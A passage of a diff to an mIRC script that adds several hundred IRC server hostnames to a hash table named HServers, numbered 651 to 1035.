+n1268= hadd HServers 651 Miami.FL.Us.SpectraNET.org
+n1269= hadd HServers 652 irc.spidernet.org
+n1270= hadd HServers 653 irc.spiraled.net
+n1271= hadd HServers 654 irc.splash-irc.de
+n1272= hadd HServers 655 irc.srpskplaneta.com
+n1273= hadd HServers 656 irc.st-city.net
+n1274= hadd HServers 657 irc.st0ned.us
+n1275= hadd HServers 658 irc.star-haven.com
+n1276= hadd HServers 659 irc.starchat.net
+n1277= hadd HServers 660 irc.starequinox.net
+n1278= hadd HServers 661 truth.starfusion.org
+n1279= hadd HServers 662 irc.starlink-irc.org
+n1280= hadd HServers 663 irc.stelars.net
+n1281= hadd HServers 664 irc.stonernet.org
+n1282= hadd HServers 665 irc.stormdancing.net
+n1283= hadd HServers 666 irc.stormirc.net
+n1284= hadd HServers 667 stormnine.linux-dude.net
+n1285= hadd HServers 668 irc.sub-city.net
+n1286= hadd HServers 669 irc.succuba.com
+n1287= hadd HServers 670 irc.superonline.com
+n1288= hadd HServers 671 irc.swapquest.com
+n1289= hadd HServers 672 irc.swipenet.org
+n1290= hadd HServers 673 irc.swissirc.net
+n1291= hadd HServers 674 Sun.SyrolNet.Org
+n1292= hadd HServers 675 SyrolNet.Org
+n1293= hadd HServers 676 irc.SysHackers.net
+n1294= hadd HServers 677 irc.t-genius.net
+n1295= hadd HServers 678 irc.talkinghost.com
+n1296= hadd HServers 679 irc.talkpinoy.com
+n1297= hadd HServers 680 irc.tech-chat.org
+n1298= hadd HServers 681 irc.TechGear007.net
+n1299= hadd HServers 682 irc.teenirc.net
+n1300= hadd HServers 683 irc.telstra.com
+n1301= hadd HServers 684 irc.that.co.nz
+n1302= hadd HServers 685 the-virtual.net
+n1303= hadd HServers 686 irc.thebigdive.net
+n1304= hadd HServers 687 irc.TheDarkRiders.net
+n1305= hadd HServers 688 irc.theibox.org
+n1306= hadd HServers 689 irc.thelight.org.uk
+n1307= hadd HServers 690 irc.thewerd.com
+n1308= hadd HServers 691 thewerd.com
+n1309= hadd HServers 692 irc.thundercity.net
+n1310= hadd HServers 693 irc.ticarichat.com
+n1311= hadd HServers 694 irc.ticarichat.net
+n1312= hadd HServers 695 irc.titanix.net
+n1313= hadd HServers 696 irc.twice-irc.de
+n1314= hadd HServers 697 irc.tlcgraphic.com
+n1315= hadd HServers 698 irc.topgamers.net
+n1316= hadd HServers 699 irc.tornevall.net
+n1317= hadd HServers 700 irc.trafficswarmers.net
+n1318= hadd HServers 701 irc.tri-net.org
+n1319= hadd HServers 702 irc.fchat.org
+n1320= hadd HServers 703 irc.trnet.org
+n1321= hadd HServers 704 irc.trutopia.net
+n1322= hadd HServers 705 irc.tscnow.net
+n1323= hadd HServers 706 tscnow.com
+n1324= hadd HServers 707 irc.turkworld.net
+n1325= hadd HServers 708 icebox.uk.tux-irc.com
+n1326= hadd HServers 709 irc.tuxnetworks.nlSERVER
+n1327= hadd HServers 710 irc.tuxnetworks.nl
+n1328= hadd HServers 711 chat.twyster.net
+n1329= hadd HServers 712 irc.uicn.net
+n1330= hadd HServers 713 irc.uirc.net
+n1331= hadd HServers 714 irc.ultrairc.net
+n1332= hadd HServers 715 irc.underchat.org
+n1333= hadd HServers 716 irc.underz.org
+n1334= hadd HServers 717 irc.unacs.bg
+n1335= hadd HServers 718 irc.unifik2.com
+n1336= hadd HServers 719 irc.unionlatina.org
+n1337= hadd HServers 720 irc.unirc.net
+n1338= hadd HServers 721 unIRC.net
+n1339= hadd HServers 722 irc.unitassoyts.net
+n1340= hadd HServers 723 irc.unitedchat.net
+n1341= hadd HServers 724 irc.united-chat.com
+n1342= hadd HServers 725 irc.univers.org
+n1343= hadd HServers 726 irc.unknownz.net
+n1344= hadd HServers 727 irc.unreal-irc.net
+n1345= hadd HServers 728 irc.usachat.net
+n1346= hadd HServers 729 irc.utchat.com
+n1347= hadd HServers 730 irc.utgames.com
+n1348= hadd HServers 731 irc.uzaynet.nl
+n1349= hadd HServers 732 asgard.valhallairc.com
+n1350= hadd HServers 733 irc.viroteck.net
+n1351= hadd HServers 734 irc.virtuanet.org
+n1352= hadd HServers 735 irc.voila.fr
+n1353= hadd HServers 736 irc.vozurbana.com
+n1354= hadd HServers 737 proxima.vsip.pl
+n1355= hadd HServers 738 irc.wankstaz,bet
+n1356= hadd HServers 739 irc.warez-junky.org
+n1357= hadd HServers 740 irc.warezcentral.net
+n1358= hadd HServers 741 WarezCentral.Net
+n1359= hadd HServers 742 irc.wavechat.net
+n1360= hadd HServers 743 irc.wcnews.com
+n1361= hadd HServers 744 irc.webchatting.com
+n1362= hadd HServers 745 irc.WeedNET.de
+n1363= hadd HServers 746 irc.wenet.ru
+n1364= hadd HServers 747 irc.wfsg.net
+n1365= hadd HServers 748 irc.whatnet.org
+n1366= hadd HServers 749 irc.whuzup.net
+n1367= hadd HServers 750 Whuzup.Net
+n1368= hadd HServers 751 irc.whynap.net
+n1369= hadd HServers 752 irc.wildthing.net.au
+n1370= hadd HServers 753 irc.winchat.net
+n1371= hadd HServers 754 Winchat.Net
+n1372= hadd HServers 755 irc.windfyre.net
+n1373= hadd HServers 756 irc.witchingwild.com
+n1374= hadd HServers 757 irc.worldirc.org
+n1375= hadd HServers 758 irc.wuhack.com
+n1376= hadd HServers 759 irc.xangelz.org
+n1377= hadd HServers 760 XAngelz.org
+n1378= hadd HServers 761 irc.xbox-irc.net
+n1379= hadd HServers 762 irc.eu.xentonix.net
+n1380= hadd HServers 763 irc.xentonix.net
+n1381= hadd HServers 764 irc.xevion.net
+n1382= hadd HServers 765 irc.xmech.net
+n1383= hadd HServers 766 irc.xnet.org
+n1384= hadd HServers 767 irc.AreaServer.Org
+n1385= hadd HServers 768 irc.xnet.net.ru
+n1386= hadd HServers 769 XNet.net.ru
+n1387= hadd HServers 770 irc.xpeacex.com
+n1388= hadd HServers 771 irc.msinternals.net
+n1389= hadd HServers 772 irc.xtc-dreams.com
+n1390= hadd HServers 773 irc.xworld.org
+n1391= hadd HServers 774 irc.yepnet.org
+n1392= hadd HServers 775 Chat.YepNet.Org
+n1393= hadd HServers 776 YepNet.Org
+n1394= hadd HServers 777 irc.your-irc.net
+n1395= hadd HServers 778 Your Irc.net
+n1396= hadd HServers 779 irc.yukle.net
+n1397= hadd HServers 780 Yukle.Net
+n1398= hadd HServers 781 irc.zanet.net
+n1399= hadd HServers 782 mystic.zanet.org.za
+n1400= hadd HServers 783 Satan.zbida.net
+n1401= hadd HServers 784 irc.zerofuzion.net
+n1402= hadd HServers 785 irc.zerolimit.net
+n1403= hadd HServers 786 irc.zeternet.org
+n1404= hadd HServers 787 irc.zincnet.net
+n1405= hadd HServers 788 irc.zirc.org
+n1406= hadd HServers 789 irc.zmajevi.net
+n1407= hadd HServers 790 irc.Zoite.net
+n1408= hadd HServers 791 irc.zombified.org
+n1409= hadd HServers 792 irc.zonic.org
+n1410= hadd HServers 793 irc.zuh.net
+n1411= hadd HServers 794 irc.zurna.net
+n1412= hadd HServers 795 irc.zurna.com
+n1413= hadd HServers 796 irc.voidz.net
+n1414= hadd HServers 797 irc.rizon.net
+n1415= hadd HServers 798 irc.indymedia.org
+n1416= hadd HServers 799 irc.abovenet.org
+n1417= hadd HServers 800 irc.afternet.org
+n1418= hadd HServers 801 irc.all-defiant.org
+n1419= hadd HServers 802 irc.allochat.net
+n1420= hadd HServers 803 irc.alphanine.net
+n1421= hadd HServers 804 irc.altnet.org
+n1422= hadd HServers 805 irc.amcool.net
+n1423= hadd HServers 806 irc.amiganet.org
+n1424= hadd HServers 807 irc.angeleyez.net
+n1425= hadd HServers 808 irc.aniverse.com
+n1426= hadd HServers 809 irc.another.net
+n1427= hadd HServers 810 irc.arabmirc.net
+n1428= hadd HServers 811 irc.astrolink.org
+n1429= hadd HServers 812 irc.auirc.net
+n1430= hadd HServers 813 irc.aurosoniq.net
+n1431= hadd HServers 814 irc.auscape.org
+n1432= hadd HServers 815 irc.aussiechat.org
+n1433= hadd HServers 816 au.austnet.org
+n1434= hadd HServers 817 nz.austnet.org
+n1435= hadd HServers 818 sg.austnet.org
+n1436= hadd HServers 819 us.austnet.org
+n1437= hadd HServers 820 irc.awesomechristians.com
+n1438= hadd HServers 821 irc.ayna.org
+n1439= hadd HServers 822 irc.bahamutirc.net
+n1440= hadd HServers 823 irc.bappy.eu.org
+n1441= hadd HServers 824 irc.bdsm-net.com
+n1442= hadd HServers 825 irc.bgirc.net
+n1443= hadd HServers 826 irc.biggheybear.co.uk
+n1444= hadd HServers 827 irc.blabber.net
+n1445= hadd HServers 828 irc.blueshadownet.org
+n1446= hadd HServers 829 irc.bolchat.org
+n1447= hadd HServers 830 irc.bubblenet.org
+n1448= hadd HServers 831 irc.bunker7.net
+n1449= hadd HServers 832 irc.carpenoctum.org
+n1450= hadd HServers 833 irc.chaosirc.net
+n1451= hadd HServers 834 irc.chatempire.net
+n1452= hadd HServers 835 eu.chatnet.org
+n1453= hadd HServers 836 us.chatnet.org
+n1454= hadd HServers 837 irc.chatworlds.net
+n1455= hadd HServers 838 irc.263.net
+n1456= hadd HServers 839 irc.cineplex1.com
+n1457= hadd HServers 840 irc.criten.net
+n1458= hadd HServers 841 irc.cyberarmy.com
+n1459= hadd HServers 842 irc.darkfalls.net
+n1460= hadd HServers 843 irc.darklitany.com
+n1461= hadd HServers 844 irc.darksystem.com
+n1462= hadd HServers 845 irc.darktree.net
+n1463= hadd HServers 846 irc.diboo.net
+n1464= hadd HServers 847 irc.draxnet.org
+n1465= hadd HServers 848 irc.earthlights.net
+n1466= hadd HServers 849 irc.easychatuk.com
+n1467= hadd HServers 850 irc.inter.net.il
+n1468= hadd HServers 851 irc.mpls.ca
+n1469= hadd HServers 852 irc.qeast.net
+n1470= hadd HServers 853 irc.inet.tele.dk
+n1471= hadd HServers 854 efnet.cs.hut.fi
+n1472= hadd HServers 855 irc.isdnet.fr
+n1473= hadd HServers 856 efnet.vuurwerk.nl
+n1474= hadd HServers 857 irc.homelien.no
+n1475= hadd HServers 858 irc.daxnet.no
+n1476= hadd HServers 859 irc.efnet.pl
+n1477= hadd HServers 860 irc.rt.ru
+n1478= hadd HServers 861 irc.du.se
+n1479= hadd HServers 862 irc.hemmet.chalmers.se
+n1480= hadd HServers 863 efnet.demon.co.uk
+n1481= hadd HServers 864 irc.easynews.com
+n1482= hadd HServers 865 irc.concentric.net
+n1483= hadd HServers 866 irc.prison.net
+n1484= hadd HServers 867 irc.mindspring.com
+n1485= hadd HServers 868 irc.umn.edu
+n1486= hadd HServers 869 irc.flamed.net
+n1487= hadd HServers 870 ircd.lagged.org
+n1488= hadd HServers 871 irc.secsup.uu.net
+n1489= hadd HServers 872 irc.weblook2k.com
+n1490= hadd HServers 873 irc.esper.net
+n1491= hadd HServers 874 irc.fdfnet.net
+n1492= hadd HServers 875 irc.financialchat.com
+n1493= hadd HServers 876 irc.fiznet.net
+n1494= hadd HServers 877 chat.freedomchat.net
+n1495= hadd HServers 878 irc.freedomirc.net
+n1496= hadd HServers 879 irc.fuelie.net
+n1497= hadd HServers 880 irc.funnet.org
+n1498= hadd HServers 881 planeshift.ath.cx
+n1499= hadd HServers 882 irc.gameslink.net
+n1500= hadd HServers 883 east.gamesnet.net
+n1501= hadd HServers 884 west.gamesnet.net
+n1502= hadd HServers 885 irc.gammaforce.org
+n1503= hadd HServers 886 irc.german-elite.net
+n1504= hadd HServers 887 irc.german-freakz.net
+n1505= hadd HServers 888 irc.goodchatting.com
+n1506= hadd HServers 889 gr.irc.gr
+n1507= hadd HServers 890 us.irc.gr
+n1508= hadd HServers 891 irc.gulfchat.net
+n1509= hadd HServers 892 irc.hanirc.org
+n1510= hadd HServers 893 irc.hells.ca
+n1511= hadd HServers 894 irc.hinet.net
+n1512= hadd HServers 895 irc.iceblaze.net
+n1513= hadd HServers 896 irc.icechat.org
+n1514= hadd HServers 897 irc.icenet.org.za
+n1515= hadd HServers 898 irc.idigital-web.com
+n1516= hadd HServers 899 irc.infatech.net
+n1517= hadd HServers 900 irc.cl
+n1518= hadd HServers 901 irc.irc-hispano.org
+n1519= hadd HServers 902 irc.irc-solution.net
+n1520= hadd HServers 903 irc.ircchat.tk
+n1521= hadd HServers 904 irc.ircee.com
+n1522= hadd HServers 905 irc.irchat.net
+n1523= hadd HServers 906 irc.ircitalia.net
+n1524= hadd HServers 907 random.ircd.de
+n1525= hadd HServers 908 irc.fr.ircnet.net
+n1526= hadd HServers 909 irc.ircd.it
+n1527= hadd HServers 910 ircnet.netvision.net.il
+n1528= hadd HServers 911 irc.tokyo.wide.ad.jp
+n1529= hadd HServers 912 irc.seed.net.tw
+n1530= hadd HServers 913 linz.irc.at
+n1531= hadd HServers 914 vienna.irc.at
+n1532= hadd HServers 915 irc.belnet.be
+n1533= hadd HServers 916 ircnet.wanadoo.be
+n1534= hadd HServers 917 irc.felk.cvut.cz
+n1535= hadd HServers 918 irc.ircnet.dk
+n1536= hadd HServers 919 irc.estpak.ee
+n1537= hadd HServers 920 irc.cs.hut.fi
+n1538= hadd HServers 921 irc.ee.auth.gr
+n1539= hadd HServers 922 irc.elte.hu
+n1540= hadd HServers 923 irc.ircnet.is
+n1541= hadd HServers 924 irc.simnet.is
+n1542= hadd HServers 925 irc.tin.it
+n1543= hadd HServers 926 irc.nl.uu.net
+n1544= hadd HServers 927 irc.xs4all.nl
+n1545= hadd HServers 928 irc.snt.utwente.nl
+n1546= hadd HServers 929 irc.sci.kun.nl
+n1547= hadd HServers 930 irc.ifi.uio.no
+n1548= hadd HServers 931 irc.pvv.ntnu.no
+n1549= hadd HServers 932 lublin.irc.pl
+n1550= hadd HServers 933 warszawa.irc.pl
+n1551= hadd HServers 934 irc.msu.ru
+n1552= hadd HServers 935 irc.ludd.luth.se
+n1553= hadd HServers 936 ircnet.demon.co.uk
+n1554= hadd HServers 937 ircnet.easynet.co.uk
+n1555= hadd HServers 938 irc.stealth.net
+n1556= hadd HServers 939 irc.ircplanet.org
+n1557= hadd HServers 940 irc.icq.net
+n1558= hadd HServers 941 irc.irctown.net
+n1559= hadd HServers 942 irczone.cl
+n1560= hadd HServers 943 random.irc.kewl.org
+n1561= hadd HServers 944 orc.dbn.za.knightnet.net
+n1562= hadd HServers 945 irc.konfido.net
+n1563= hadd HServers 946 irc.krono.net
+n1564= hadd HServers 947 irc.krushnet.org
+n1565= hadd HServers 948 reaper.lagnet.org.za
+n1566= hadd HServers 949 mystery.lagnet.org.za
+n1567= hadd HServers 950 irc.linkbr.com.br
+n1568= hadd HServers 951 irc.liquidized.net
+n1569= hadd HServers 952 irc.mircx.com
+n1570= hadd HServers 953 irc.mistrider.net
+n1571= hadd HServers 954 irc.muhabbet.net
+n1572= hadd HServers 955 irc.musirc.com
+n1573= hadd HServers 956 irc.mynetpal.org
+n1574= hadd HServers 957 irc.netgamers.org
+n1575= hadd HServers 958 irc.nullus.net
+n1576= hadd HServers 959 irc.openprojects.net
+n1577= hadd HServers 960 irc.overgun.net
+n1578= hadd HServers 961 irc.oz.org
+n1579= hadd HServers 962 irc.p2pchat.org
+n1580= hadd HServers 963 irc.peacefulhaven.net
+n1581= hadd HServers 964 irc.phrozn.net
+n1582= hadd HServers 965 abschat.abs-cbn.com
+n1583= hadd HServers 966 irc.prochat.org
+n1584= hadd HServers 967 irc.quazie.net
+n1585= hadd HServers 968 irc.quicknet.nl
+n1586= hadd HServers 969 irc.realmnet.com
+n1587= hadd HServers 970 irc.redlatona.net
+n1588= hadd HServers 971 irc.renegadeirc.net
+n1589= hadd HServers 972 irc.risanet.com
+n1590= hadd HServers 973 irc.rubiks.net
+n1591= hadd HServers 974 irc.tsk.ru
+n1592= hadd HServers 975 irc.serv.co.il
+n1593= hadd HServers 976 irc.sexnet.org
+n1594= hadd HServers 977 kechara.sorcery.net
+n1595= hadd HServers 978 irc.spirit-harmony.com
+n1596= hadd HServers 979 irc.starlink.org
+n1597= hadd HServers 980 irc.starwars-irc.net
+n1598= hadd HServers 981 irc.tech-chat.net
+n1599= hadd HServers 982 irc.tni3.com
+n1600= hadd HServers 983 topirc.sytes.net
+n1601= hadd HServers 984 irc.touch.net.gr
+n1602= hadd HServers 985 irc.teklan.com.tr
+n1603= hadd HServers 986 irc.twyster.net
+n1604= hadd HServers 987 irc.uberninja.net
+n1605= hadd HServers 988 irc.uk-net.org
+n1606= hadd HServers 989 irc.unibrasil.org
+n1607= hadd HServers 990 irc.wakenet.org
+n1608= hadd HServers 991 irc.warped.net
+n1609= hadd HServers 992 irc.watnet.org
+n1610= hadd HServers 993 irc.weaklinks.net
+n1611= hadd HServers 994 irc.wyldryde.net
+n1612= hadd HServers 995 irc.xchat.gr
+n1613= hadd HServers 996 apophis.zanet.org.za
+n1614= hadd HServers 997 sokar.zanet.org.za
+n1615= hadd HServers 998 irc.telecoms.bg
+n1616= hadd HServers 999 irc.mnet.bg
+n1617= hadd HServers 1000 irc.tu-varna.edu
+n1618= hadd HServers 1001 irc.naturella.com
+n1619= hadd HServers 1002 irc.comnet.bg
+n1620= hadd HServers 1003 irc.lirex.com
+n1621= hadd HServers 1004 irc.netplus.bg
+n1622= hadd HServers 1005 irc.evko.com
+n1623= hadd HServers 1006 irc.bitex.com
+n1624= hadd HServers 1007 irc.interbgc.com
+n1625= hadd HServers 1008 irc.prolink.bg
+n1626= hadd HServers 1009 irc.techno-link.com
+n1627= hadd HServers 1010 irc.lt-tech.org
+n1628= hadd HServers 1011 irc.spnet.net
+n1629= hadd HServers 1012 irc.omega.bg
+n1630= hadd HServers 1013 irc.nbu.bg
+n1631= hadd HServers 1014 irc.bourgas.net
+n1632= hadd HServers 1015 irc.BGBest.net
+n1633= hadd HServers 1016 irc.UniBG.org
+n1634= hadd HServers 1017 irc.ITDNet.net
+n1635= hadd HServers 1018 irc.asenovgrad.net
+n1636= hadd HServers 1019 irc.langame.net
+n1637= hadd HServers 1020 irc.otel.net
+n1638= hadd HServers 1021 irc.Digy-Tech.com
+n1639= hadd HServers 1022 irc.bia-bg.com
+n1640= hadd HServers 1023 irc.hot.bg
+n1641= hadd HServers 1024 irc.ChatBG.net
+n1642= hadd HServers 1025 irc.netel.bg
+n1643= hadd HServers 1026 irc.vega.bg
+n1644= hadd HServers 1027 irc.net-surf.net
+n1645= hadd HServers 1028 irc.sohbetci.com
+n1646= hadd HServers 1029 irc.koc.net
+n1647= hadd HServers 1030 irc.doruk.net
+n1648= hadd HServers 1031 irc.ada.net.tr
+n1649= hadd HServers 1032 irc.e-kolay.net
+n1650= hadd HServers 1033 irc.Uslanmaz.com
+n1651= hadd HServers 1034 irc.ankaranet.net
+n1652= hadd HServers 1035 irc.klavye.com
+n1653=}
+:end
